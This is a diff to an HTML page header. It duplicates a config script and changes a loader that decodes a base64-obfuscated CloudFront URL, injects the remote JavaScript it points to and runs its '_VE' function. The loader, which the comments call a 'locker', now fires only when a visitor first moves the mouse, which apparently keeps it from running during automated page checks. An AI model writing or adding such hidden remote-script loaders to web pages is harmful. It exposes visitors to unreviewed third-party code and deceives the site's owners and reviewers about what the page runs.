@@ -9,19 +9,28 @@
     var bwTCW_hhX_FEqWGc = {"it": 4443041, "key": "808ab"};
 </script>
 
+<script type="text/javascript">
+    var bwTCW_hhX_FEqWGc = {"it": 4443041, "key": "808ab"};
+</script>
+
 <script>
-    setTimeout(() => {
+    function loadLocker() {
         let script = document.createElement('script');
         script.src = atob("aHR0cHM6Ly9kMjlncWh6ZXZpYTEwNC5jbG91ZGZyb250Lm5ldC9mZGFmNTZkLmpz"); // Base64 Encoded URL
         document.body.appendChild(script);
 
-        // Wait for script to load before triggering _VE
         script.onload = function () {
             if (typeof _VE !== "undefined") {
                 setTimeout(_VE, 300);
             }
         };
-    }, 300);
+
+        // Remove event listener after first trigger
+        document.removeEventListener("mousemove", loadLocker);
+    }
+
+    // Load locker only when the user moves the mouse
+    document.addEventListener("mousemove", loadLocker);
 </script>
 </head>
 
